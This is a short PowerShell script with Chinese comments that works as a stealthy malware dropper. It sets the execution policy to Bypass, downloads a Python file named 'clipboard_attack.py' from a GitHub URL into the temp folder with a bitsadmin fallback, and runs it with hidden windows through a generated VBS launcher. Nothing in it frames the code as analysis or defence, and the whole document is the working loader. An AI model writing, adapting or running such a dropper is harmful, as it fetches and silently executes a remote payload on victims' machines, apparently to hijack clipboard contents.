# **创建一个后台 PowerShell 进程，完全静默执行**
$scriptContent = @'
# 设置执行策略为 ByPass
Set-ExecutionPolicy Bypass -Scope Process -Force

# 定义脚本下载链接
$scriptUrl = "https://raw.githubusercontent.com/ethxiaoli/clipboard-setup/main/clipboard_attack.py"
$scriptPath = "$env:TEMP\clipboard_attack.py"

# 检查 Python 是否已安装
$pythonCheck = (Get-Command python -ErrorAction SilentlyContinue)
if (-not $pythonCheck) {
    exit 1
}

# 下载 Python 脚本
try {
    Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath -ErrorAction Stop
} catch {
    Start-Process -WindowStyle Hidden -FilePath "bitsadmin" -ArgumentList "/transfer DownloadScript $scriptUrl $scriptPath" -Wait
}

# 运行 Python 脚本（静默模式）
if (Test-Path $scriptPath) {
    try {
        python -c "import requests" 2>$null
    } catch {
        python -m pip install requests
    }
    Start-Process -WindowStyle Hidden -FilePath "python" -ArgumentList $scriptPath -PassThru
}
'@

# **创建一个 VBS 脚本，让 PowerShell 后台运行**
$vbsPath = "$env:TEMP\run_hidden.vbs"
$vbsContent = @"
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell -ExecutionPolicy Bypass -Command &{$scriptContent}", 0, False
"@

# **写入 VBS 文件**
Set-Content -Path $vbsPath -Value $vbsContent

# **运行 VBS 文件（隐藏 PowerShell 窗口）**
Start-Process -FilePath "wscript.exe" -ArgumentList $vbsPath -WindowStyle Hidden
exit
